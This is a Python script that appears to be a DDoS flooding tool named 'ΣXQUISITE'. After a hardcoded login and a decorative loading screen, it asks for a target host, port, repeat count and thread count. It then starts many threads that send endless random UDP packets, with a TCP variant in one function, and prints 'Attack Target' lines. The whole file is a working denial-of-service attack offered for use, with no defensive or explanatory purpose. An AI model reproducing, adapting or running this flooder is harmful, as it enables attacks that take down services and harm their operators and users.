import random
import socket
import os
import time
import threading

os.system("clear")
print("""\033[37m
   ▀      ▄▄  ▄███▄
 ▄▀▀▀▄   ▄█████████▀
 █    █  ▄██████  █▀
 █    █  ▀██████████▄
 ▀▄   ▀▀▀▀▀▀▀▀█▀▀██▀
   █  ▀▄▄    ▄▄▀   ██▀
 █▄▄▄▄▄▄▄█    ███▄▄
\r""")
print("     - ΣXQUISITE -\n\r")

print("""\033[31m╔═[\033[34mUsername\033[31m]""")
username = str(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mPassword\033[31m]""")
password = str(input("\033[31m╚════> \033[34m"))
time.sleep(2)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading.\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading.\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading.\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading..\033[31m]<═")
time.sleep(0.8)
os.system("clear")
print("\033[31m[\033[37mStatus\033[31m] ═>[\033[37mLoading...\033[31m]<═")
time.sleep(0.8)
os.system("clear")
if username == "ZieL" and password == "#zielx":
	print("\033[34m[\033[37mStatus\033[34m] ═>[\033[37mLogin Succesfull\033[34m]<═")
	time.sleep(2.5)
else:
	print("\033[34m[\033[37mStatus\033[34m] ═>[\033[37mCan't Login To Tools\033[34m]<═")
	exit()
os.system("clear")
time.sleep(2.2)
print("""
\033[34m╔═╗═╗ ╦╔═╗ ╦ ╦\033[31m╦╔═╗╦╔╦╗╔═╗
\033[34m║╣ ╔╩╦╝║═╬╗║ ║\033[31m║╚═╗║ ║ ║╣ 
\033[34m╚═╝╩ ╚═╚═╝╚╚═╝\033[31m╩╚═╝╩ ╩ ╚═╝

\033[31m[\033[37mTeam\033[31m]        ═>[\033[37m  ΣXQUISITE++ \033[31m]<═
\033[34m[\033[37mDiscord\033[34m]     ═>[  \033[37mZ1#7872\033[34m     ]<═
\033[32m[\033[37mCreate Date\033[32m] ═>[\033[37m  3/Sep/2022\033[32m  ]<═
\n\r""")

print("""\033[31m╔═[\033[34mZieL - Host/Ip\033[31m]""")
ip = str(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Port\033[31m]""")
port = int(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Times\033[31m]""")
times = int(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Threads\033[31m]""")
threads = int(input("\033[31m╚════> \033[34m"))
print("""\033[31m╔═[\033[34mZieL - Ready? \033[37m(\033[32my/\033[31mn\033[37m) \033[31m]""")
ready = str(input("\033[31m╚════> \033[34m"))
if ready == 'n':
	exit()
os.system("clear")
	
def run():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
		except:
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
def run2():
	data = random._urandom(4096)
	while True:
				try:
					s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
					addr = (str(ip),int(port))
					s.sendto(data,addr)
					for x in range(times):
						s.send(data)
						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				except:
					s.close()
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
def run3():
	data = random._urandom(2048)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
		except:
				s.close()
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
def run4():
	data = random._urandom(1460)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
		except:
				s.close()
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
def run5():
	data = random._urandom(4906)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
		except:
				s.close()
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
def run6():
	data = random._urandom(2048)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
		except:
				s.close()
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
def run7():
	data = random._urandom(4906)
	while True:
				try:
					s = socket.socket(socket.SOCK_STREAM)
					s.connect((ip,port))
					s.send(data)
					for x in range(times):
						s.send(data)
						print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				except:
					s.close
				print(f"\033[31m[\033[37m+\033[31m] \033[37mAttack Target: \033[31m{ip}, \033[37mPort: \033[31m{port}, \033[37mTimes: \033[31m{times}, \033[37mThreads: \033[31m{threads}.")
				
for y in range(threads):
	if ready == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
	else:
		th = threading.Thread(target = run7)
		th.start()
